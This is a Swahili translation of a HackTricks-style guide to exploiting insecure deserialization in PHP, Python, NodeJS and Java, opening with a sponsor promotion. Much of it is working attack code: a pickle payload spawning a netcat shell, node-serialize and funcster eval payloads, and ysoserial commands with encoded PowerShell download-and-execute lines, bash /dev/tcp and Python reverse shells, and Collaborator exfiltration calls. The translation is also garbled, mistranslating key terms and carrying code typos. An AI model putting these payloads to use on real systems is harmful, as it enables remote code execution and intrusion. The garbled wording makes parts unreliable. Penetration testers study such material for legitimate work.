# Ufisadi wa Data

<details>

<summary><strong>Jifunze kuhusu ufisadi wa AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA USAJILI**](https://github.com/sponsors/carlospolop)!
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za kuhack kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

## Taarifa Msingi

**Ufisadi wa Data** unaeleweka kama njia ya kubadilisha kitu kuwa muundo unaoweza kuhifadhiwa, kwa lengo la kuhifadhi kitu au kutuma kama sehemu ya mchakato wa mawasiliano. Mbinu hii mara nyingi hutumiwa kuhakikisha kwamba kitu kinaweza kurejeshwa wakati mwingine, kudumisha muundo na hali yake.

**Ufisadi wa Data**, kwa upande mwingine, ni mchakato unaopinga ufisadi wa data. Inahusisha kuchukua data iliyopangwa katika muundo maalum na kuirejesha kuwa kitu.

Ufisadi wa data unaweza kuwa hatari kwa sababu inaweza **kuruhusu wachomaji kubadilisha data iliyofisadiwa ili kutekeleza nambari hatari** au kusababisha tabia isiyotarajiwa kwenye programu wakati wa mchakato wa kurejesha kitu. 

## PHP

Katika PHP, njia maalum za kichawi hutumiwa wakati wa mchakato wa ufisadi na ufisadi wa data:

* `__sleep`: Inaitwa wakati kitu kinapotumika kufisadiwa. Njia hii inapaswa kurudisha safu ya majina ya mali zote za kitu ambazo zinapaswa kufisadiwa. Mara nyingi hutumiwa kuhifadhi data inayosubiri au kutekeleza kazi za kusafisha sawa.
* `__wakeup`: Inaitwa wakati kitu kinapotumika kufisadiwa. Hutumiwa kurejesha tena uhusiano wowote wa database ambao unaweza kuwa umepotea wakati wa ufisadi na kutekeleza kazi zingine za kuanzisha upya.
* `__unserialize`: Njia hii inaitwa badala ya `__wakeup` (ikiwepo) wakati kitu kinapotumika kufisadiwa. Hutoa udhibiti zaidi juu ya mchakato wa ufisadi ikilinganishwa na `__wakeup`.
* `__destruct`: Njia hii inaitwa wakati kitu kinapokuwa karibu kuharibiwa au wakati wa mwisho wa skripti. Mara nyingi hutumiwa kwa kazi za kusafisha, kama kufunga vitambulisho vya faili au uhusiano wa database.
* `__toString`: Njia hii inaruhusu kitu kutendewa kama string. Inaweza kutumika kusoma faili au kazi zingine kulingana na wito wa kazi ndani yake, ikitoa uwakilishi wa maandishi wa kitu.
```php
<?php
class test {
public $s = "This is a test";
public function displaystring(){
echo $this->s.'<br />';
}
public function __toString()
{
echo '__toString method called';
}
public function __construct(){
echo "__construct method called";
}
public function __destruct(){
echo "__destruct method called";
}
public function __wakeup(){
echo "__wakeup method called";
}
public function __sleep(){
echo "__sleep method called";
return array("s"); #The "s" makes references to the public attribute
}
}

$o = new test();
$o->displaystring();
$ser=serialize($o);
echo $ser;
$unser=unserialize($ser);
$unser->displaystring();

/*
php > $o = new test();
__construct method called
__destruct method called
php > $o->displaystring();
This is a test<br />

php > $ser=serialize($o);
__sleep method called

php > echo $ser;
O:4:"test":1:{s:1:"s";s:14:"This is a test";}

php > $unser=unserialize($ser);
__wakeup method called
__destruct method called

php > $unser->displaystring();
This is a test<br />
*/
?>
```
Ikiangalia matokeo unaweza kuona kwamba kazi **`__wakeup`** na **`__destruct`** zinaitwa wakati kitu kinapodeserialized. Tafadhali kumbuka kwamba katika mafunzo kadhaa utaona kwamba kazi ya **`__toString`** inaitwa wakati unapojaribu kuchapisha sifa fulani, lakini inaonekana kwamba **hilo halifanyiki tena**.

{% hint style="warning" %}
Mbinu ya **`__unserialize(array $data)`** inaitwa **badala ya `__wakeup()`** ikiwa imefanywa katika darasa. Inaruhusu wewe kudeserialize kitu kwa kutoa data iliyodeserialized kama safu. Unaweza kutumia mbinu hii kudeserialize mali na kutekeleza kazi zozote muhimu wakati wa deserialization.
```php
class MyClass {
private $property;

public function __unserialize(array $data): void {
$this->property = $data['property'];
// Perform any necessary tasks upon deserialization.
}
}
```
{% endhint %}

Unaweza kusoma mfano wa PHP ulioelezwa **hapa**: [https://www.notsosecure.com/remote-code-execution-via-php-unserialize/](https://www.notsosecure.com/remote-code-execution-via-php-unserialize/), hapa [https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf](https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf) au hapa [https://securitycafe.ro/2015/01/05/understanding-php-object-injection/](https://securitycafe.ro/2015/01/05/understanding-php-object-injection/)

### PHP Deserial + Autoload Classes

Unaweza kutumia utendaji wa kupakia wa PHP kusoma faili za php za kupendelea na zaidi:

{% content-ref url="php-deserialization-+-autoload-classes.md" %}
[php-deserialization-+-autoload-classes.md](php-deserialization-+-autoload-classes.md)
{% endcontent-ref %}

### Kurejelea Thamani zilizoseriwa

Ikiwa kwa sababu fulani unataka kuseri thamani kama **marejeleo kwa thamani nyingine iliyoseriwa** unaweza:
```php
<?php
class AClass {
public $param1;
public $param2;
}

$o = new WeirdGreeting;
$o->param1 =& $o->param22;
$o->param = "PARAM";
$ser=serialize($o);
```
### PHPGGC (ysoserial for PHP)

[**PHPGGC**](https://github.com/ambionics/phpggc) inaweza kukusaidia kuunda mizigo ya kudanganya deserializations za PHP.\
Tambua kwamba katika visa kadhaa **hutaweza kupata njia ya kudanganya deserialization katika msimbo wa chanzo** wa programu lakini unaweza **kudanganya msimbo wa nyongeza za PHP za nje.**\
Kwa hivyo, ikiwa unaweza, angalia `phpinfo()` ya seva na **tafuta kwenye mtandao** (na hata kwenye **vifaa** vya **PHPGGC**) baadhi ya vifaa vinavyowezekana unavyoweza kudanganya.

### phar:// metadata deserialization

Ikiwa umepata LFI ambayo inasoma faili tu na sio kutekeleza msimbo wa php ndani yake, kwa mfano kutumia kazi kama _**file\_get\_contents(), fopen(), file() au file\_exists(), md5\_file(), filemtime() au filesize()**_**.** Unaweza jaribu kudanganya **deserialization** inayotokea wakati wa **kusoma** **faili** kwa kutumia itifaki ya **phar**.\
Kwa habari zaidi soma chapisho lifuatalo:

{% content-ref url="../file-inclusion/phar-deserialization.md" %}
[phar-deserialization.md](../file-inclusion/phar-deserialization.md)
{% endcontent-ref %}

## Python

### **Pickle**

Wakati kitu kinapopata unpickle, kazi _\_\_reduce\_\__ itatekelezwa.\
Ikidanganywa, seva inaweza kurudisha kosa.
```python
import pickle, os, base64
class P(object):
def __reduce__(self):
return (os.system,("netcat -c '/bin/bash -i' -l -p 1234 ",))
print(base64.b64encode(pickle.dumps(P())))
```
Kwa habari zaidi kuhusu kutoroka kutoka **jela za pickle** angalia:

{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
{% endcontent-ref %}

### Yaml **&** jsonpickle

Ukurasa ufuatao unawasilisha mbinu ya **kutumia vibaya uhariri usio salama katika maktaba za python za yamls** na unamalizia na chombo kinachoweza kutumika kuzalisha mzigo wa uhariri wa RCE kwa **Pickle, PyYAML, jsonpickle na ruamel.yaml**:

{% content-ref url="python-yaml-deserialization.md" %}
[python-yaml-deserialization.md](python-yaml-deserialization.md)
{% endcontent-ref %}

### Uchafuzi wa Darasa (Python Prototype Pollution)

{% content-ref url="../../generic-methodologies-and-resources/python/class-pollution-pythons-prototype-pollution.md" %}
[class-pollution-pythons-prototype-pollution.md](../../generic-methodologies-and-resources/python/class-pollution-pythons-prototype-pollution.md)
{% endcontent-ref %}

## NodeJS

### JS Magic Functions

JS **haina "vifaa vya uchawi"** kama PHP au Python ambavyo vitatekelezwa tu kwa kujenga kitu. Lakini ina **vifaa** ambavyo mara nyingi hutumiwa hata bila kuita moja kwa moja kama vile **`toString`**, **`valueOf`**, **`toJSON`**.\
Ukitumia uhariri unaweza **kuathiri vifaa hivi kutekeleza nambari nyingine** (kwa uwezekano wa kutumia uchafuzi wa protini) unaweza kutekeleza nambari ya aina yoyote wanapoitwa.

Njia nyingine ya **"uchawi" ya kuita kazi** bila kuita moja kwa moja ni kwa **kuathiri kitu kinachorudishwa na kazi ya async** (ahadi). Kwa sababu, ikiwa **unabadilisha** kitu hicho **kurudi** katika ahadi nyingine na **mali** iliyoitwa **"then" ya aina ya kazi**, itatekelezwa tu kwa sababu imerudishwa na ahadi nyingine. _Fuata_ [_**kiungo hiki**_](https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/) _kwa habari zaidi._
```javascript
// If you can compromise p (returned object) to be a promise
// it will be executed just because it's the return object of an async function:
async function test_resolve() {
const p = new Promise(resolve => {
console.log('hello')
resolve()
})
return p
}

async function test_then() {
const p = new Promise(then => {
console.log('hello')
return 1
})
return p
}

test_ressolve()
test_then()
//For more info: https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/
```
### `__proto__` na uchafuzi wa `prototype`

Ikiwa unataka kujifunza kuhusu mbinu hii **angalia mafunzo yafuatayo**:

{% content-ref url="nodejs-proto-prototype-pollution/" %}
[nodejs-proto-prototype-pollution](nodejs-proto-prototype-pollution/)
{% endcontent-ref %}

### [node-serialize](https://www.npmjs.com/package/node-serialize)

Maktaba hii inaruhusu kuserilisha kazi. Mfano:
```javascript
var y = {
"rce": function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })},
}
var serialize = require('node-serialize');
var payload_serialized = serialize.serialize(y);
console.log("Serialized: \n" + payload_serialized);
```
**Kitu kilichoserilishwa** kitakuwa kama:
```bash
{"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })}"}
```
Unaweza kuona katika mfano kwamba wakati kazi inapotiwa mfululizo bendera ya `_$$ND_FUNC$$_` inaongezwa kwenye kitu kilichofanyiwa mfululizo.

Ndani ya faili `node-serialize/lib/serialize.js` unaweza kupata bendera ile ile na jinsi nambari inavyoitumia.

![](<../../.gitbook/assets/image (351).png>)

![](<../../.gitbook/assets/image (446).png>)

Kama unavyoweza kuona katika kipande cha mwisho cha nambari, **ikiwa bendera inapatikana** `eval` hutumiwa kufanya kazi ya kufanya kitu kilichofanyiwa mfululizo, kwa hivyo **kimsingi kuingia kwa mtumiaji inatumika ndani ya kazi ya `eval`**.

Hata hivyo, **kufanya mfululizo** wa kazi **haitatekelezwa** kama itakuwa muhimu kwamba sehemu fulani ya nambari inaita `y.rce` katika mfano wetu na hiyo ni **isiyowezekana sana**.\
Kwa njia yoyote, unaweza tu **kurekebisha kitu kilichofanyiwa mfululizo** **kwa kuongeza baadhi ya mabano** ili kutekeleza kiotomatiki kazi iliyofanyiwa mfululizo wakati kitu kinapotenguliwa mfululizo.\
Katika kipande cha nambari kinachofuata **tambua mabano ya mwisho** na jinsi kazi ya `unserialize` itakavyotekeleza nambari kiotomatiki:
```javascript
var serialize = require('node-serialize');
var test = {"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()"};
serialize.unserialize(test);
```
Kama ilivyotangulia kutajwa, maktaba hii itapata nambari baada ya `_$$ND_FUNC$$_` na ita **itekeleza** kutumia `eval`. Kwa hivyo, ili **kitekeleze nambari moja kwa moja** unaweza **kufuta sehemu ya uundaji wa kazi** na mabano ya mwisho na **kutekeleza JS oneliner** kama katika mfano ufuatao:
```javascript
var serialize = require('node-serialize');
var test = '{"rce":"_$$ND_FUNC$$_require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) })"}';
serialize.unserialize(test);
```
Unaweza [**kupata hapa**](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/) **maelezo zaidi** kuhusu jinsi ya kutumia udhaifu huu.

### [funcster](https://www.npmjs.com/package/funcster)

Kitu cha kuvutia kuhusu **funcster** ni kutokuwepo kwa **vitu vya kujengwa kawaida**; viko nje ya wigo wa kufikiwa. Kizuizi hiki kinazuia utekelezaji wa nambari inayojaribu kuita njia kwenye vitu vilivyojengwa kawaida, ikisababisha makosa kama `"ReferenceError: console is not defined"` wakati amri kama `console.log()` au `require(something)` zinapotumiwa.

Licha ya kizuizi hiki, kurejesha upatikanaji kamili wa muktadha wa ulimwengu, ikiwa ni pamoja na vitu vya kujengwa kawaida vyote, kunawezekana kupitia njia maalum. Kwa kutumia moja kwa moja muktadha wa ulimwengu, mtu anaweza kuepuka kizuizi hiki. Kwa mfano, upatikanaji unaweza kurejeshwa kutumia sehemu ifuatayo:
```javascript
funcster = require("funcster");
//Serialization
var test = funcster.serialize(function() { return "Hello world!" })
console.log(test) // { __js_function: 'function(){return"Hello world!"}' }

//Deserialization with auto-execution
var desertest1 = { __js_function: 'function(){return "Hello world!"}()' }
funcster.deepDeserialize(desertest1)
var desertest2 = { __js_function: 'this.constructor.constructor("console.log(1111)")()' }
funcster.deepDeserialize(desertest2)
var desertest3 = { __js_function: 'this.constructor.constructor("require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) });")()' }
funcster.deepDeserialize(desertest3)
```
**Kwa** [**mashauri zaidi soma chanzo hiki**](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)**.**

### [**serialize-javascript**](https://www.npmjs.com/package/serialize-javascript)

Kifurushi cha **serialize-javascript** kimeundwa kipekee kwa madhumuni ya ufuatiliaji, bila uwezo wowote wa kujijenga wa kufuatilia. Watumiaji wanawajibika kutekeleza njia yao wenyewe ya kufuatilia. Matumizi moja kwa moja ya `eval` inapendekezwa na mfano rasmi kwa kufuatilia data iliyofuatiliwa:
```javascript
function deserialize(serializedJavascript){
return eval('(' + serializedJavascript + ')');
}
```
Ikiwa kazi hii hutumiwa kwa kusakinisha vitu unaweza **kuitumia kwa urahisi**:
```javascript
var serialize = require('serialize-javascript');
//Serialization
var test = serialize(function() { return "Hello world!" });
console.log(test) //function() { return "Hello world!" }

//Deserialization
var test = "function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()"
deserialize(test)
```
**Kwa** [**mashine zaidi soma chanzo hiki**](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)**.**

### Maktaba ya Cryo

Kwenye kurasa zifuatazo unaweza kupata habari kuhusu jinsi ya kutumia maktaba hii kutekeleza amri za kupindukia:

* [https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)
* [https://hackerone.com/reports/350418](https://hackerone.com/reports/350418)

## Java - HTTP

Katika Java, **wito wa kurejesha nyuma wa deserialization unatekelezwa wakati wa mchakato wa deserialization**. Utekelezaji huu unaweza kutumiwa na wachomaji ambao hupanga mizigo ya kudhuru ambayo inachochea wito huu wa kurejesha nyuma, ikisababisha utekelezaji wa hatua zenye madhara.

### Alama za Vidole

#### Sanduku Jeusi

Kutambua uwezekano wa udhaifu wa uhuishaji wa kificho tafuta:

* Darasa zinazotekeleza kiolesura cha `Serializable`.
* Matumizi ya `java.io.ObjectInputStream`, `readObject`, `readUnshare` kazi.

Toa tahadhari maalum kwa:

* `XMLDecoder` iliyotumiwa na parameta zilizofafanuliwa na watumiaji wa nje.
* Mbinu ya `fromXML` ya `XStream`, haswa ikiwa toleo la XStream ni sawa au chini ya 1.46, kwani inaweza kuwa na maswala ya uhuishaji.
* `ObjectInputStream` pamoja na mbinu ya `readObject`.
* Utekelezaji wa mbinu kama vile `readObject`, `readObjectNodData`, `readResolve`, au `readExternal`.
* `ObjectInputStream.readUnshared`.
* Matumizi ya jumla ya `Serializable`.

#### Sanduku Jekundu

Kwa upimaji wa sanduku jekundu, tafuta **sahihi maalum au "Herufi za Ajaabu"** zinazoashiria vitu vilivyohuishwa vya Java (vinavyotoka kwa `ObjectInputStream`):

* Mtindo wa Hexadecimal: `AC ED 00 05`.
* Mtindo wa Base64: `rO0`.
* Vichwa vya majibu ya HTTP na `Content-type` iliyowekwa kuwa `application/x-java-serialized-object`.
* Mtindo wa Hexadecimal unaotaja ujazo wa awali: `1F 8B 08 00`.
* Mtindo wa Base64 unaotaja ujazo wa awali: `H4sIA`.
* Faili za wavuti zenye kielezo cha `.faces` na parameta ya `faces.ViewState`. Kugundua mifano hii katika programu ya wavuti inapaswa kuchochea uchunguzi kama ulivyoelezwa katika [chapisho kuhusu Deserialization ya ViewState ya Java JSF](java-jsf-viewstate-.faces-deserialization.md).
```
javax.faces.ViewState=rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAJwdAAML2xvZ2luLnhodG1s
```
### Angalia kama kuna udhaifu

Ikiwa unataka **kujifunza kuhusu jinsi shambulio la Deserialized la Java linavyofanya kazi** unapaswa kutazama [**Deserialization ya Java ya Msingi**](basic-java-deserialization-objectinputstream-readobject.md), [**Deserialization ya Java ya DNS**](java-dns-deserialization-and-gadgetprobe.md), na [**Malipo ya CommonsCollection1**](java-transformers-to-rutime-exec-payload.md).

#### Jaribio la White Box

Unaweza kuangalia ikiwa kuna programu iliyosakinishwa na udhaifu uliojulikana.
```bash
find . -iname "*commons*collection*"
grep -R InvokeTransformer .
```
Unaweza **kuangalia maktaba zote** ambazo inajulikana kuwa na mapungufu na ambazo [**Ysoserial**](https://github.com/frohoff/ysoserial) inaweza kutoa shambulio. Au unaweza kuangalia maktaba zilizoorodheshwa kwenye [Java-Deserialization-Cheat-Sheet](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#genson-json).\
Unaweza pia kutumia [**gadgetinspector**](https://github.com/JackOfMostTrades/gadgetinspector) kutafuta mnyororo wa vifaa vya uwezekano ambao unaweza kutumiwa kwa shambulio.\
Unapokuwa unatumia **gadgetinspector** (baada ya kuujenga) usijali juu ya onyo/makosa mengi yanayopita na ruhusu iishe. Itaandika matokeo yote chini ya _gadgetinspector/gadget-results/gadget-chains-year-month-day-hore-min.txt_. Tafadhali, kumbuka kwamba **gadgetinspector haitaunda shambulio na inaweza kuonyesha matokeo sahihi**.

#### Jaribio la Sanduku Jeusi

Kwa kutumia kifaa cha Burp [**gadgetprobe**](java-dns-deserialization-and-gadgetprobe.md) unaweza kutambua **maktaba zipi zinapatikana** (na hata toleo). Kwa habari hii inaweza kuwa **rahisi kuchagua mzigo** wa kutumia kwa shambulio.\
[Soma hii kujifunza zaidi kuhusu GadgetProbe](java-dns-deserialization-and-gadgetprobe.md#gadgetprobe)**.**\
GadgetProbe inazingatia **deserializations za `ObjectInputStream`**.

Kwa kutumia kifaa cha Burp [**Java Deserialization Scanner**](java-dns-deserialization-and-gadgetprobe.md#java-deserialization-scanner) unaweza **kutambua maktaba zenye mapungufu** yanayoweza kutumiwa na ysoserial na **kuzitumia**.\
[Soma hii kujifunza zaidi kuhusu Java Deserialization Scanner.](java-dns-deserialization-and-gadgetprobe.md#java-deserialization-scanner)\
Java Deserialization Scanner inazingatia **deserializations za `ObjectInputStream`**.

Unaweza pia kutumia [**Freddy**](https://github.com/nccgroup/freddy) kutambua mapungufu ya **deserializations** katika **Burp**. Programu-jalizi hii itagundua mapungufu siyo tu yanayohusiana na **`ObjectInputStream`** bali pia mapungufu kutoka maktaba za deserializations za **Json** na **Yml**. Kwa hali ya kazi, itajaribu kuthibitisha kwa kutumia mzigo wa kulala au DNS.\
[Pata habari zaidi kuhusu Freddy hapa.](https://www.nccgroup.com/us/about-us/newsroom-and-events/blog/2018/june/finding-deserialisation-issues-has-never-been-easier-freddy-the-serialisation-killer/)

**Jaribio la Ufufuaji**

Si kila kitu ni kuhusu kuangalia kama maktaba yoyote inayoweza kuwa na mapungufu inatumika na seva. Mara nyingine unaweza **kubadilisha data ndani ya kitu kilichoseriwa na kuepuka baadhi ya ukaguzi** (labda kukupa mamlaka ya msimamizi ndani ya programu-jalizi ya wavuti).\
Ikiwa unapata kitu kilichoseriwa cha Java kinachotumwa kwa programu-jalizi ya wavuti, **unaweza kutumia** [**SerializationDumper**](https://github.com/NickstaDB/SerializationDumper) **kuchapisha muundo wa kibinadamu zaidi wa kitu kilichoseriwa kinachotumwa**. Kujua data unayotuma itakuwa rahisi kuihariri na kuepuka baadhi ya ukaguzi.

### **Shambulio**

#### **ysoserial**

Zana kuu ya kutumia deserializations za Java ni [**ysoserial**](https://github.com/frohoff/ysoserial) ([**pakua hapa**](https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar)). Unaweza pia kuzingatia kutumia [**ysoseral-modified**](https://github.com/pimps/ysoserial-modified) ambayo itakuruhusu kutumia amri ngumu (kwa mfano na mabomba).\
Tafadhali kumbuka kuwa zana hii inazingatia kwa kiasi kikubwa kwenye kudanganya **`ObjectInputStream`**.\
Ningeanza kutumia mzigo wa "URLDNS" **kabla ya mzigo wa RCE** kujaribu kama uingizaji ni wa kufanikiwa. Hata hivyo, kumbuka kwamba labda mzigo wa "URLDNS" haifanyi kazi lakini mzigo mwingine wa RCE unafanya kazi.
```bash
# PoC to make the application perform a DNS req
java -jar ysoserial-master-SNAPSHOT.jar URLDNS http://b7j40108s43ysmdpplgd3b7rdij87x.burpcollaborator.net > payload

# PoC RCE in Windows
# Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections5 'cmd /c ping -n 5 127.0.0.1' > payload
# Time, I noticed the response too longer when this was used
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c timeout 5" > payload
# Create File
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c echo pwned> C:\\\\Users\\\\username\\\\pwn" > payload
# DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c nslookup jvikwa34jwgftvoxdz16jhpufllb90.burpcollaborator.net"
# HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c certutil -urlcache -split -f http://j4ops7g6mi9w30verckjrk26txzqnf.burpcollaborator.net/a a"
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAYwBlADcAMABwAG8AbwB1ADAAaABlAGIAaQAzAHcAegB1AHMAMQB6ADIAYQBvADEAZgA3ADkAdgB5AC4AYgB1AHIAcABjAG8AbABsAGEAYgBvAHIAYQB0AG8AcgAuAG4AZQB0AC8AYQAnACkA"
## In the ast http request was encoded: IEX(New-Object Net.WebClient).downloadString('http://1ce70poou0hebi3wzus1z2ao1f79vy.burpcollaborator.net/a')
## To encode something in Base64 for Windows PS from linux you can use: echo -n "<PAYLOAD>" | iconv --to-code UTF-16LE | base64 -w0
# Reverse Shell
## Encoded: IEX(New-Object Net.WebClient).downloadString('http://192.168.1.4:8989/powercat.ps1')
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4ANAA6ADgAOQA4ADkALwBwAG8AdwBlAHIAYwBhAHQALgBwAHMAMQAnACkA"

#PoC RCE in Linux
# Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "ping -c 5 192.168.1.4" > payload
# Time
## Using time in bash I didn't notice any difference in the timing of the response
# Create file
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "touch /tmp/pwn" > payload
# DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "dig ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "nslookup ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
# HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "curl ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net" > payload
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "wget ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
# Reverse shell
## Encoded: bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}" | base64 -w0
## Encoded: export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,ZXhwb3J0IFJIT1NUPSIxMjcuMC4wLjEiO2V4cG9ydCBSUE9SVD0xMjM0NTtweXRob24gLWMgJ2ltcG9ydCBzeXMsc29ja2V0LG9zLHB0eTtzPXNvY2tldC5zb2NrZXQoKTtzLmNvbm5lY3QoKG9zLmdldGVudigiUkhPU1QiKSxpbnQob3MuZ2V0ZW52KCJSUE9SVCIpKSkpO1tvcy5kdXAyKHMuZmlsZW5vKCksZmQpIGZvciBmZCBpbiAoMCwxLDIpXTtwdHkuc3Bhd24oIi9iaW4vc2giKSc=}|{base64,-d}|{bash,-i}"

# Base64 encode payload in base64
base64 -w0 payload
```
Upon creating a payload for **java.lang.Runtime.exec()** you **cannot use special characters** like ">" or "|" to redirect the output of an execution, "$()" to execute commands or even **pass arguments** to a command separated by **spaces** (you can do `echo -n "hello world"` but you can't do `python2 -c 'print "Hello world"'`). In order to encode correctly the payload you could [use this webpage](http://www.jackson-t.ca/runtime-exec-payloads.html).

Feel free to use the next script to create **all the possible code execution** payloads for Windows and Linux and then test them on the vulnerable web page:
```python
import os
import base64

# You may need to update the payloads
payloads = ['BeanShell1', 'Clojure', 'CommonsBeanutils1', 'CommonsCollections1', 'CommonsCollections2', 'CommonsCollections3', 'CommonsCollections4', 'CommonsCollections5', 'CommonsCollections6', 'CommonsCollections7', 'Groovy1', 'Hibernate1', 'Hibernate2', 'JBossInterceptors1', 'JRMPClient', 'JSON1', 'JavassistWeld1', 'Jdk7u21', 'MozillaRhino1', 'MozillaRhino2', 'Myfaces1', 'Myfaces2', 'ROME', 'Spring1', 'Spring2', 'Vaadin1', 'Wicket1']
def generate(name, cmd):
for payload in payloads:
final = cmd.replace('REPLACE', payload)
print 'Generating ' + payload + ' for ' + name + '...'
command = os.popen('java -jar ysoserial.jar ' + payload + ' "' + final + '"')
result = command.read()
command.close()
encoded = base64.b64encode(result)
if encoded != "":
open(name + '_intruder.txt', 'a').write(encoded + '\n')

generate('Windows', 'ping -n 1 win.REPLACE.server.local')
generate('Linux', 'ping -c 1 nix.REPLACE.server.local')
```
#### vifaa vya kuzuia serialkiller

Unaweza **kutumia** [**https://github.com/pwntester/SerialKillerBypassGadgetCollection**](https://github.com/pwntester/SerialKillerBypassGadgetCollection) **pamoja na ysoserial kuunda mabao zaidi**. Taarifa zaidi kuhusu chombo hiki zinapatikana kwenye **slaidi za mazungumzo** ambapo chombo kilipowasilishwa: [https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next\_slideshow=1](https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next\_slideshow=1)

#### marshalsec

[**marshalsec**](https://github.com/mbechler/marshalsec) inaweza kutumika kuzalisha mzigo wa kudanganya kutumia maktaba tofauti za uhuishaji wa **Json** na **Yml** kwenye Java.\
Ili kutekeleza mradi huo nilihitaji **kuongeza** hizi **tegemezi** kwenye `pom.xml`:
```markup
<dependency>
<groupId>javax.activation</groupId>
<artifactId>activation</artifactId>
<version>1.1.1</version>
</dependency>

<dependency>
<groupId>com.sun.jndi</groupId>
<artifactId>rmiregistry</artifactId>
<version>1.2.1</version>
<type>pom</type>
</dependency>
```
**Sakinisha maven**, na **kupachika** mradi:
```bash
sudo apt-get install maven
mvn clean package -DskipTests
```
#### FastJSON

Soma zaidi kuhusu maktaba hii ya Java JSON: [https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html](https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html)

### Maabara

* Ikiwa unataka kujaribu baadhi ya malipo ya ysoserial unaweza **kukimbia programu-jalizi hii**: [https://github.com/hvqzao/java-deserialize-webapp](https://github.com/hvqzao/java-deserialize-webapp)
